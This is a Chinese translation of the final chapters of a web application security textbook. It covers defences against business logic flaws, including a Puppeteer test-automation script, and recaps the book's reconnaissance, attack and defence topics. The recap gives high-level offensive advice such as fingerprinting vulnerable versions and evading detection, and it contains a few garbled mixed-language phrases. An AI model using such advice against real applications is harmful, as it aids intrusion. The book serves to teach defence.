业务逻辑漏洞通常需要关于应用业务逻辑的深度知识，因此更难以发起攻击。幸运的是，由于理解此类漏洞通常需要深厚的工程知识，因此防御这些漏洞要比对它们发起攻击容易得多。

假定您的安全团队与您的工程团队紧密合作，那么在缓解业务逻辑漏洞和保障应用安全方面，您实际上将拥有优势。本章讨论预防和缓解业务逻辑漏洞的方法。

### 架构级缓解

缓解业务逻辑漏洞最重要的步骤发生在架构阶段，在实际编写任何应用代码之前。在传统的 Web 应用架构设计中，预期用户是与预期用例一起被考虑的。

不幸的是事实确实如此，因为许多其他技术领域已经识别出了最坏情况设计（Worst-Case Scenario Design）的价值。让我们评估以下展示最坏情况设计益处的示例，然后讨论我们如何使用这些原则来使我们的应用安全受益。

考虑一个算法（A1）运行的中位数大 O 时间为 $O(n)$ 的编程案例。给定五个元素作为算法 A1 的输入，我们可以推断此算法的中位数运行时间为 $C = 5$。

然而，如果该算法有 $1/10$ 的概率运行时间为 $O(n^2)$，那么在拥有五个元素的最坏情况下，我们将面临 $C = 25$ 的运行时间。如果所有其他运行都结束在 $C = 5$ 的中位数运行时间，那么我们面临 9 次耗时为 5 的运行，以及 1 次耗时为 25 的运行。这在表 36-1 中进行了展示。

*表 36-1. 算法 A1 运行时间*

| 运行次数 | 运行时间 | 中位数运行时间 | 平均运行时间 |
| :------- | :------- | :------------- | :----------- |
| 1        | 5        | 5              | 5            |
| 2        | 5        | 5              | 5            |
| 3        | 5        | 5              | 5            |
| 4        | 5        | 5              | 5            |
| 5        | 5        | 5              | 5            |
| 6        | 5        | 5              | 5            |
| 7        | 5        | 5              | 5            |
| 8        | 5        | 5              | 5            |
| 9        | 5        | 5              | 5            |
| 10       | 25       | 5              | 7            |

这使我们在 10 次尝试中的平均运行时间为 $(9 \times 5 + 25) / 10 = 7$。中位数运行时间仍然是 5。

让我们考虑，我们起初有两个可用的算法，A1（我们刚刚看过的那个）和 A2。以下是使用中位数评估的每个算法的规格说明：

* A1 中位数时间: 5
* A2 中位数时间: 6

通过基于中位数进行评估的方法，我们假设 A1 是更好的选择。但如果我们深入钻研并意识到 A2 始终以 6 的恒定速度运行，我们随后就会意识到，随着时间的推移，A1 趋向于 7，这使得它比 A2 的效率低 16%。

这是**最佳情况设计（Best-Case Design）**的一个例子。优秀的安全架构师从不使用最佳情况设计，而始终使用最坏情况设计。

如果架构师选择了 A1 算法，那么在此应用中，它的运行速度将比 A2 更快，直到边缘案例发生。经过多次迭代，那些边缘案例将减慢 A1 相对于 A2 的速度，以至于 A2 实际上比 A1 更快。

从一开始就简单地考虑应用中每个功能组件的恶意用例，将赋予您规避绝大部分业务逻辑漏洞的优势。通过在每个应用架构中实现最坏情况设计，您将在实际编写任何代码之前捕获业务逻辑漏洞。

在前面的章节中，我们讨论了绝大部分业务逻辑漏洞是如何由于用户以非预期或非期望的方式使用应用而产生的。与前面的示例类似，对产出的每个架构考虑最坏的情况，将使您能够在编写任何代码或向用户暴露具有安全隐患的生产环境最佳情况设计应用之前，发现这些非预期的场景。

就时间分配而言，这很可能是停止业务逻辑漏洞最有效的方法。在架构设计之后，解决这些漏洞会花费更多的时间且更加昂贵。

### 统计学建模

在检测光谱的更具数学性的一端，我们可以利用统计学建模（Statistical Modeling）。该技术将模糊测试（Fuzzing）（使用随机数据输入测试应用的过程）的各个方面与数据科学和浏览器自动化相结合，以便在检测业务逻辑漏洞方面，允许您以比单独的随机模糊测试快得多的方式进行裁剪、选择和迭代。

在此流程的第一步中，开发人员将分析学（Analytics）集成到 Web 应用中，或者提出关于用户将如何使用该应用的假设。此模型应该同时包含用户被假定使用的**输入（Inputs）**和**定向页面流（Directional Pageflows）（操作/Actions）**。

#### 建模输入

对于应用中的每个输入，考虑用户最可能使用的值。对于下拉列表，按选择频率对下拉项进行排序。对于自由文本输入，对最常见的输入进行排序。对于单选按钮，考虑哪一个最经常被选中。

非常规和非期望的输入也应该予以考虑。换句话说，如果标记为 “name” 的自由文本字段中最常见的输入值是前一千个最受欢迎名字列表中的名字，我们还必须包含一小部分用户会选择一个不在列表中的名字的事实。

在实践中，这些名字最终将开始包含非常规字符、长度等。这些非常规的边缘案例非常重要，因为它们极有可能凸显代码未妥善考虑上述输入值的逻辑漏洞。

继续对应用中的字段进行建模，直到所有用户交互的字段都完成了建模。建模的输入（和操作）应该存储在易于通过程序读取的格式中，例如 JSON、YAML、CSV 或 XML。

#### 建模操作

在传统的 Web 应用中，操作通常是定向的页面流。在现代应用中，除了定向页面流之外，这些操作通常包含点击按钮、链接和在后台创建 AJAX 请求的表单。

有时，Web 应用还会使用繁衍弹窗（Modals）、发起 WebSocket 或实时通信（RTC）网络调用、或者直接调用 JavaScript 函数的交互式元素。在继续前进之前，我们需要对所有这些操作进行建模。

幸运的是，使用大多数公司已经在使用的主流分析工具，很容易获取和建模操作路径。因此，尽管尚未在安全洞察上采取行动，您的业务很可能已经拥有此数据。

为了方便日后的自动化，以与您处理输入相同的格式记录用户可能会采取的所有潜在操作。

#### 模型开发

在构建输入和操作的模型之后的下一步，是用程序使客户端流程自动化。这将使您能够在安全的本地测试环境中开始识别发生的业务逻辑漏洞。

从技术视角来看，用户只是数据库中的一组位（Bits），因此用模型用户填充数据库应该并不困难。另一方面，使用这些用户模拟 Web 应用的遍历和操作使用，在技术上可能会稍微更具挑战性。

幸运的是，存在被称为无头浏览器（Headless Browsers）的工具，允许以流线型和易于采用的方式实现 Web 应用遍历自动化。这些浏览器实现浏览器 DOM、运行 JavaScript 代码，并可以像正常浏览器一样执行网络查询——但它们是通过程序进行控制的，而不是通过 UI 控制。

这些工具中最流行的是 Google 的 Headless Chrome，它采用了与 Phantom.js 和 Slimer.js 类似的 API，后者是前十年最常使用的浏览器控制工具。您将需要利用这些工具之一来通过程序测试您的模型。

考虑以下在底层利用了 Google Headless Chrome API 的代码片段：

```javascript
import puppeteer from 'puppeteer';
import data from 'model';
import tools from 'tools';

(async () => {
 const browser = await puppeteer.launch();
 const page = await browser.newPage();
 await page.goto(data.startURL);

 // 配置无头浏览器
 await page.setViewport({width: 1080, height: 1024});

 // 创建用户
 await page.type('.sign-up-username', data[0].username);
 await page.type('.sign-up-username', data[0].password);
 await page.click('.sign-up');
 await tools.logSignUpStatus()

 // 注册后添加评论
 const commentBox = '.comment-box';
 await page.waitForSelector(commentBox);
 await page.type('.comment-box', data[0].messages[0]);
 await page.click('.submit-comment');
 await tools.logCommentStatus()

 // 关闭浏览器并结束自动化
 await browser.close();
})();
```

这个简单的示例利用了 Puppeteer，它是 Google Headless Chrome 的包装库，通常仅能通过命令行或终端访问。它从我们开发的模型中提取数据，并针对目标网站程序化地执行一组输入、点击和页面过渡。

此示例与您的实现之间的主要区别在于，此形式的漏洞检测所需的特定自动化将取决于您 Web 应用内的具体业务逻辑。然而，编程模型极有可能与 Headless Chrome Puppeteer 示例非常相似；像 Chrome 这样的浏览器现在实现了通过该方式使浏览器自动化的标准 API。

#### 模型分析

在针对利用您 Web 应用的无头 Web 浏览器运行模型的整个过程中，您应该在 Payload、响应和 HTTP 状态码方面记录每一次网络请求。特别是，您要确保在运行完显着的样本量后，服务器中的任何非预期错误或故障都是易于发现的。

这些错误通常会引导您发现业务逻辑漏洞，随后可以由您的工程团队进行修复。

在发现无法被利用的错误的情况下——不用担心。此活动仍为非安全 Bug 提供了宝贵的洞察，并且解决它们将改善您的用户体验。

### 总结

业务逻辑漏洞源于应用的架构师要么没有考虑特定的边缘案例，要么忘记在应用逻辑内部实现妥善的制衡（Checks and Balances）。这些漏洞呈现出许多问题，主要是因为它们因应用而异。

虽然业务逻辑漏洞在同行业内的两个应用之间可能会有一些相似之处，但从逻辑和技术角度对其发起攻击的方法很可能会有所不同。因此，这些漏洞既难以发起攻击，又难以检测、缓解和修复。

妥善准备检测、缓解和修复这些漏洞的最重要组件，是开始思考您编写的功能如何能以非预期的形式被使用。一旦确立了这种思维模式，就可以更安全地设计应用架构、开发自动化防御系统，并且您的应用防范这些攻击的安全姿态可能终于开始有所改善。不要忽视这些漏洞，即使它们有时起初呈现为编程 Bug，而不是安全漏洞。

在您 Web 应用的源码中描述的业务逻辑，往往是您企业拥有的最关键的数字资产。这些漏洞越是因为困难或所需专业知识而被忽视，它们就会变得越来越危险，因为随着时间的推移，应用中通常会添加更多的功能和威能。记住那句古老的编程格言：“在架构设计阶段花 1 分钟修复 Bug，可以省去在实现阶段花 10 分钟解决 Bug 的精力。”

---

## 第 37 章第三部分总结
当今的 Web 应用包含众多的复杂性，范围从第三方依赖项到复杂的缓存和分发架构。这些层中的每一个都增加了攻击面，使漏洞利用变得前所未有地容易，并在每一步都强化了对明智缓解措施的需求。

如果您从头到尾阅读了本书，您现在应该对现代黑客如何攻击 Web 应用有了一个良好的理解。您应该明白，对抗这些黑客的防御性解决方案必须是全面的、细致的，并且要定期修改和更新。

幸运的是，通过我们在第三部分中讨论的聪明架构，例如零信任架构、框架级缓解措施、自动化漏洞发现和威胁建模，可以减轻这一任务的部分负担。通过理解如何缓解最常见和最有效的 Web 应用漏洞形式——并能够实现最小化手动重复安全努力的安全工作流和流程——您可以给任何 Web 应用的安全姿态带来巨大的积极影响。

由于黑客选择不同的攻击方法、且浏览器和工具在实现开箱即用的缓解措施方面变得更好，第三部分中讨论的具体缓解措施可能会随时间而发生改变。然而，这些设计哲学、分析方法和架构模式应该在您的整个职业生涯中使您受益。

---

全书译文完结。

> 译者注：
> 1. 在第 34 章的 `updateUserData(data)` 函数示例中，由于其内部再次无条件递归调用了 `updateUserData(data)` 自身，在 JavaScript 实际运行时会直接导致调用栈溢出错误（RangeError: Maximum call stack size exceeded）。此处应为原作者书写代码时的逻辑疏忽。在实际开发中，应使用已被键名验证过滤后的数据进行后续的业务更新。
> 2. 在第 36 章的 Puppeteer 自动化测试脚本中，第 12 行代码本意是输入密码，但选择器错误地写成了专属于用户名的类名 `.sign-up-username`（`await page.type('.sign-up-username', data[0].password);`）。若实际执行，会导致密码和用户名都被输入至用户名输入框，导致自动化登录流失败。应将其修改为密码输入框对应的选择器（例如 `.sign-up-password`）。

### 结论

恭喜您，您已经完成了《Web应用安全：现代Web应用的利用与对策》（*Web Application Security: Exploitation and Countermeasures for Modern Web Applications*）的每一个核心部分的学习。您现在已经掌握了关于Web应用侦察（Reconnaissance）、用于对抗Web应用的攻势黑客技术（Offensive Hacking Techniques），以及可用于降低应用被黑客攻击风险的防御性缓解措施（Defensive Mitigations）和最佳实践（Best Practices）的知识。

在本书的“结论”中，我将指出每个部分讨论的一些关键主题。如果您需要温故知新，不妨通读到最后，并重新阅读以下任何主题。

### 软件安全的历史

通过对历史事件的妥善评估，我们可以看到现代防御和攻势技术的起源。从这些起源中，我们可以更好地理解软件发展的方向，并在开发下一代攻势和防御技术时利用历史经验教训。以下是第1章的主要收获：

#### 电话盗用
* 为了扩大电话网络的规模，人工话务员被自动接线系统所取代，该系统依赖声音频率来将电话彼此连接。
* 早期的黑客，被称为“电话黑客（Phreakers）”，学会了模拟这些频率并利用管理音频，从而使他们能够免费拨打电话。
* 为了应对电话盗用，贝尔实验室（Bell Labs）的科学家们开发了双音多频（Dual-Tone Multi-Frequency，DTMF）系统，该系统不易被轻易复制。在很长一段时间内，这消除或显著减少了电话盗用行为。
* 最终，人们开发出了能够模拟 DTMF 音频的专用硬件，使得该系统对电话黑客失效。
* 最终，电话交换中心转向了数字化，从而消除了电话盗用的风险。出于向下兼容的目的，DTMF 音频仍保留在现代电话中。

#### 计算机黑客攻击
* 尽管个人计算机已经存在，但 Commodore 64 是第一台兼具用户友好性和价格亲民性的计算机，从而引发了个人计算机的广泛普及。
* 美国计算机科学家弗雷德·科恩（Fred Cohen）展示了第一款计算机病毒，该病毒能够自我复制并通过软盘从一台计算机传播到另一台计算机。
* 另一位美国计算机科学家罗伯特·莫里斯（Robert Morris）成为有记录以来第一个在研究实验室之外部署计算机病毒的人。莫里斯蠕虫（Morris Worm）在发布后的一天内就传播到了约 15,000 台连接到网络的计算机。
* 美国政府问责局（US Government Accountability Office）在历史上首次介入，并制定了有关黑客攻击的正式法律。莫里斯随后成为首位被定罪的计算机黑客，被判处 10,500 美元的罚款和 400 小时的社区服务。

#### 万维网
* Web 1.0 的发展为黑客攻击服务器和网络开辟了新的途径。
* Web 2.0 的兴起（涉及基于超文本传输协议（Hypertext Transfer Protocol，HTTP）的用户间协作）为黑客带来了一个新的攻击向量（Attack Vector）：浏览器。
* 由于网络是建立在旨在保护服务器和网络的安全机制之上的，在开发出更好的安全机制和协议之前，许多用户的设备和数据都遭到了破坏。

#### 现代Web应用
* 自引入 Web 2.0 以来，浏览器安全性得到了极大提升。这改变了竞争格局，导致黑客开始更多地针对应用代码中的逻辑漏洞（Logical Vulnerabilities），而不是服务器软件、网络协议或Web浏览器中存在的漏洞。
* Web 2.0 的引入还带来了包含比以往任何时候都更具价值的数据的应用。银行、保险甚至医疗都将关键业务功能移至了Web上。这为黑客创造了一个“赢家通吃”的竞技场，其中的赌注比以往任何时候都要高。
* 由于当今的黑客瞄准的是应用源代码中的逻辑漏洞，因此软件开发人员和安全专家开始开展协作至关重要。个人贡献不再像过去那样有价值。

---

### 侦察

由于现代Web应用规模和复杂性的不断增加，寻找应用漏洞的第一步是合理地绘制应用画像并评估每个主要功能组件的架构或逻辑风险。在攻击Web应用之前，进行合理应用侦察是必不可少的第一步。良好的侦察将使您对目标Web应用有深入的了解，这既可用于确定攻击的优先顺序，又可用于避免被发现。

侦察技能可以让您洞察合格的攻击者会如何攻击您的Web应用。如果您是应用所有者，这将为您带来额外的好处，使您能够优先考虑防御。由于现代Web应用日益复杂，您的侦察技能可能会受到您工程能力的限制。因此，侦察与工程专业知识是相辅相成的：

#### 现代Web应用的结构
* 与20年前的Web应用不同，当今的应用建立在多层技术之上，通常具有广泛的“服务器到用户”和“用户到用户”的功能。大多数应用使用多种形式的持久化，将数据存储在服务器和客户端（通常是浏览器）上。正因为如此，任何Web应用的潜在表面积都是相当广泛的。
* 现代Web应用中使用的数据库类型、展示层技术和服务端软件，都是建立在解决Web应用过去所遇到问题的基础之上的。在很大程度上，现代应用生态系统在开发时考虑到了开发人员的效率和用户体验。正因为如此，出现了一些以前不可能出现的新型漏洞。

#### 子域名、API 和 HTTP
* 精通Web应用侦察需要您了解完全绘制Web应用表面积的方法。因为当今的Web应用比过去分布式得多，在发现可利用的代码之前，您可能需要熟悉（并找到）多个Web服务器。此外，这些Web服务器之间的逆向交互不仅可以帮助您理解目标应用，还可以帮助您确定攻击的优先级。
* 在应用层，当今大多数网站都使用 HTTP 进行客户端和服务器之间的通信。然而，新的协议正在被开发并集成到现代Web应用中。未来的Web应用可能会大量使用套接字（Sockets）或实时通信（RTC），因此利用易于适应的侦察技术是至关重要的。

#### 第三方依赖
* 当当今的Web应用对第三方集成的依赖程度，与对第一方代码的依赖程度不相上下。有时，它们对第三方集成的依赖甚至超过了第一方代码。这些依赖项并没有按照与第一方代码相同的标准进行审计，因此，它们可以成为黑客的良好攻击向量。
* 利用侦察技术，我们可以对Web服务器、客户端框架、CSS框架和数据库的具体版本进行指纹识别（Fingerprint）。通过这些指纹，我们也许能够确定具体的可利用（含有漏洞的）版本。

#### 应用架构
* 对应用软件架构的妥善评估，可以发现由于安全控制不一致而导致的广泛漏洞。
* 应用安全架构可以作为应用中代码质量的代名词——这是黑客在评估重点攻击哪个应用时非常看重的信号。

---

### 攻势

进行应用侦察可以让攻击者了解不安全的表面积，从而开始开发和部署漏洞利用程序（Exploits），以窃取重要数据或强制应用以非预期的方式运行。第二部分的关键点如下：

#### 跨站脚本攻击
* 从本质上讲，当应用以允许脚本执行的方式不当使用用户提供的输入时，就会发生跨站脚本攻击（Cross-Site Scripting，XSS）。
* 当通过对文档对象模型（Document Object Model，DOM）元素进行无害化处理（Sanitization），或者在应用程序接口（Application Programming Interface，API）级别（或两者结合）妥善缓解了传统形式的 XSS 时，仍有可能发现 XSS 漏洞。XSS 接收端（Sinks）的存在是由于浏览器 DOM 规范中的缺陷造成的，有时也是由于未妥善实现的第三方集成造成的。

#### 跨站请求伪造
* 跨站请求伪造（Cross-Site Request Forgery，CSRF）攻击利用了浏览器与用户之间建立的信任关系。由于这种关系的信任性质，配置不当的应用可能会代表无意中点击链接或填写Web表单的用户，接受权限提升的请求。
* 如果“唾手可得的果实”（改变状态的 HTTP GET 请求）已经被过滤，那么应该考虑其他攻击方法，例如 Web 表单。

#### XML 外部实体
* XML 规范中的一个缺陷允许配置不当的 XML 解析器泄露敏感的服务器文件，以响应有效的 XML 请求 Payload。
* 当请求直接从客户端接受 XML 或类似 XML 的 Payload 时，这些漏洞通常是显而易见的。在更复杂的应用中，间接 XXE（XML 外部实体）也是可能的。当服务器接受来自用户的 Payload，然后构建一个 XML 文件发送给 XML 解析器，而不是直接接受 XML 对象时，就会发生间接 XXE。

#### 注入攻击
* 尽管 SQL 注入攻击是最广为人知且防范最严密的，但针对服务器响应 API 请求而使用的任何命令行界面（CLI）实用程序，都可能发生注入攻击。
* SQL 数据库（通常）得到了很好的注入防范。由于这种攻击方法已记录得非常详尽，自动化测试非常适合用于测试著名的 SQL 注入攻击。如果 SQL 注入失败，可以考虑将图像压缩器、备份实用程序和其他 CLI 工具作为潜在目标。

#### 拒绝服务
* 拒绝服务（Denial of Service，DoS）攻击的形式多种多样，从令人恼火的服务器性能下降，一直到对合法用户的完全服务中断。
* DoS 攻击可以针对正则表达式求值引擎、消耗资源的服务端进程，也可以仅仅针对具有海量流量或请求的标准应用或网络功能。

#### 攻击数据和对象
* 所有编程语言在如何处理内存中的数据和函数方面都有规则。在理解了这些规则及其特异性之后，您就可以开始构建突破边界并导致非预期操作的数据结构。
* 针对对象的某些类型的攻击（例如批量赋值或序列化攻击），允许攻击者仅通过理解和利用通用数据格式中预期的边界，来攻击应用程序。

#### 客户端攻击
* 某些形式 of 攻击仅针对浏览器客户端，因此，开发人员更难检测和缓解。事实上，其中一些攻击取决于当时使用的特定浏览器，这意味着在正常的开发工作流程中可能无法检测到它们。
* 标签页劫持（Tabnabbing）、点击劫持（Clickjacking）和原型链污染（Prototype Pollution）攻击允许攻击者在不需要用户执行服务端工作流程的情况下，窃取数据并危害用户会话。正因为如此，这些攻击只需将客户端代码下载到本地设备即可进行离线开发。这使得漏洞利用的开发过程变得非常简单。

#### 利用第三方依赖
* 第三方依赖正迅速成为黑客最容易利用的攻击向量之一。这是由多种因素共同决定的，其中一个因素是第三方依赖项通常没有像第一方代码那样受到严密审计。
* 开源 CVE 数据库可用于查找先前报告的、著名依赖项中的已知漏洞，然后可以利用这些漏洞攻击目标应用，除非该应用已被更新或手动修复。

#### 业务逻辑漏洞
* 业务逻辑漏洞（Business Logic Vulnerabilities）是针对攻击者所瞄准的应用所特有的漏洞。这些漏洞更难被发现，因为它们依赖于对应用业务逻辑的理解，并找到打破预期用户流程的方法。
* 因为业务逻辑漏洞是特定于特定业务规则集的漏洞，所以使用静态应用安全测试（Static Application Security Testing，SAST）、动态应用安全测试（Dynamic Application Security Testing，DAST）或软件成分分析（Software Composition Analysis，SCA）等自动化工具很难发现这些漏洞。因此，它们经常被忽视，并在生产环境的应用中存在一段时间，然后才被发现并被利用或修复，这取决于谁发现了它们。

---

### 防御

以下是第三部分的主要收获：

#### 安全的应用架构
* 编写安全的 Web 应用始于架构阶段。在此阶段发现的漏洞，其修复成本可能比在生产代码中发现的漏洞低多达 60 倍。
* 合理的安全架构可以针对常见的安全风险提供应用范围内的缓解措施，而不是临时（On-demand）的缓解措施，后者更容易出现不一致或被遗忘。

#### 安全的应用配置
* 除了以安全的方式编写应用之外，利用应用技术栈中现有的所有标准安全功能也至关重要。这样做可以消除在复制通用安全控制方面的大量手动安全工作。
* 在基于浏览器的应用中，安全机制可由 JavaScript、DOM 以及浏览器本身的开发人员提供。通常这些机制需要进行一些配置才能启用。但一旦启用，它们就可以保护您的应用免受许多最常见攻击类型的侵害。

#### 安全的用户体验
* 保护 Web 应用的源代码和实现是一个极好的开始，但最安全的 Web 应用还会将安全纳入其用户界面（UI）开发过程中。
* 在其 UI 中使用安全最佳实践的 Web 应用，更有可能协助用户采用多因素身份验证（MFA）、强密码策略等最佳实践。

#### 威胁建模
* 威胁建模（Threat Modeling）是行业标准，也是在应用开发之前发现并记录应用中安全漏洞的极具价值的工具。
* 在威胁建模阶段发现的安全漏洞，其解决成本和速度几乎总是显著低于在生产后或代码编写完成后发现的漏洞。

#### 审查代码以确保安全
* 在确定了安全的应用架构之后，应该实施合理的安全代码审查（Secure Code Review）流程，以防止常见且易于发现的安全漏洞被推送到生产环境中。
* 代码审查阶段的安全审查与传统代码审查的执行方式类似。主要区别应该是寻找的漏洞类型，以及在有限的时间内如何确定文件和模块的优先级。

#### 漏洞发现
* 理想情况下，漏洞应该在部署到生产应用之前被发现。不幸的是，情况往往并非如此。但是，您可以利用几种技术来减少生产环境中的漏洞数量。
* 除了实现您自己的漏洞发现流水线之外，您还可以通过漏洞赏金计划（Bug Bounty Programs）和渗透测试人员的形式利用第三方专家的优势。这些服务不仅可以帮助您尽早发现漏洞，还可以激励黑客向您的组织报告漏洞以获取报酬，而不是在黑市上出售发现的漏洞或自己利用该漏洞。

#### 漏洞管理
* 一旦发现漏洞，应进行重现和会商（Triaged）。应根据漏洞的潜在影响对其进行评分，以便能够合理地优先安排其修复工作。
* 存在许多用于确定漏洞严重程度的评分算法，其中通用漏洞评分系统（Common Vulnerability Scoring System，CVSS）最为著名。您的组织必须实施评分算法。您选择哪种评分算法并不那么重要，重要的是您确实在使用一个。每个评分系统都会有误差，但只要它能够区分高风险和低风险漏洞之间的差异，它就会帮助您优先安排工作分配和漏洞修复的方式。

#### 防御 XSS 攻击
* XSS 攻击可以在 Web 应用栈 of 多个位置得到缓解：在 API 级别使用无害化函数、在数据库中，或在客户端。因为 XSS 攻击针对的是客户端，所以客户端是实施缓解措施最重要的表面积。
* 简单的 XSS 漏洞可以通过聪明的编码来消除，特别是在处理 DOM 时。更高级的 XSS 漏洞（例如依赖 DOM 接收端的漏洞）要难缓解得多，甚至可能无法重现！因此，了解每种 XSS 类型最常见的接收端（Sinks）和源端（Sources）至关重要。

#### 防御 CSRF 攻击
* CSRF 攻击利用了用户和浏览器之间的信任关系。因此，通过为浏览器无法自动确认的改变状态的请求引入额外规则，可以缓解 CSRF 攻击。
* 存在许多针对 CSRF 类似漏洞的缓解措施，从简单地在代码库中消除改变状态的 GET 请求，到实施 CSRF 令牌（Tokens）并在高权限 API 请求中要求 MFA 确认。

#### 防御 XXE
* 大多数 XXE 攻击都既容易利用又容易防护。所有现代 XML 解析器都提供了允许禁用外部实体的配置选项。
* 更高级的 XXE 防御涉及考虑类似 XML 的格式和类似 XML 的解析器，例如 SVG、PDF、RTF 等，并以与对待真实 XML 解析器相同的方式评估这些解析器的实现和使用，以确定是否存在任何交叉功能。

#### 防御注入攻击
* 针对 SQL 数据库的注入攻击可以通过合理的 SQL 配置和合理的 SQL 查询生成（例如预处理语句）来阻止或减少。
* 针对 CLI 接口的注入攻击更难检测和防范。在设计或实现这些工具时，应强烈考虑最小授权原则（Principle of Least Authority）和关注点分离（Separation of Concerns）等最佳实践。

#### 防御 DoS
* 源自单一攻击者的 DoS 攻击可以通过扫描正则表达式以检测回溯问题、防止用户 API 调用访问消耗大量服务器资源的函数，并在需要时对这些函数添加速率限制（Rate Limitations）来进行缓解。
* 分布式拒绝服务（DDoS）攻击更难缓解，但缓解措施应从防火墙开始，并逐步向上部署。将流量进行黑洞路由（Blackholing）是一个潜在的解决方案，求助于专门研究 DDoS 的带宽管理服务也是一个解决方案。

#### 防御数据和对象攻击
* 针对数据和对象的攻击通常由于验证薄弱或数据结构规范薄弱而发生。通过识别在其他应用中报告的常见弱点，您可以更有效地在您自己的应用中避免这些数据结构弱点。
* 某些用于存储数据的格式本质上不那么安全。通过对所有主要数据格式的优缺点（从安全角度）建立理解，您可以更好地向开发人员提供关于什么功能应该使用什么数据格式的建议。

#### 防御客户端攻击
* 因为客户端攻击发生在浏览器内部，所以缓解这些攻击的第一步应该始终是看向浏览器，以便启用浏览器厂商提供和维护的缓解措施。在这种情况下，诸如内容安全策略（CSP）之类的工具提供了第一道防线。
* 当第一道防线不足够时，许多客户端攻击可以通过利用强大的功能（如 `Object.freeze()`）或防框架嵌套（Framebuster）脚本，深入研究 JavaScript 和 DOM 来进行缓解。

#### 保障第三方依赖安全
* 第三方依赖是现代 Web 应用的安全祸害之一。由于它们在第一方应用中的猖獗引入，加上安全审计的参差不齐，第三方依赖是导致应用灭亡的常见原因。
* 整合第三方集成的方式应该限制该集成的权限和范围，使其仅限于必要的范围。此外，在整合之前，应该对这些集成进行扫描和审查。这包括研究 CVE 数据库，以确定是否有其他研究人员或组织报告了影响相关集成的漏洞。

#### 缓解业务逻辑漏洞
* 业务逻辑漏洞无法通过通用工具轻易发现。它们需要一种更动手（Hands-on）的方法来检测。幸运的是，在软件开发阶段进行全面的测试可以消除所需的一些努力。
* 可以为应用的用户工作流建立模型，并自动测试各种输入、用户流和命令。虽然这通常不是一个全面的解决方案，但它可能有助于识别代码库中更容易受到业务逻辑相关问题影响的组件。

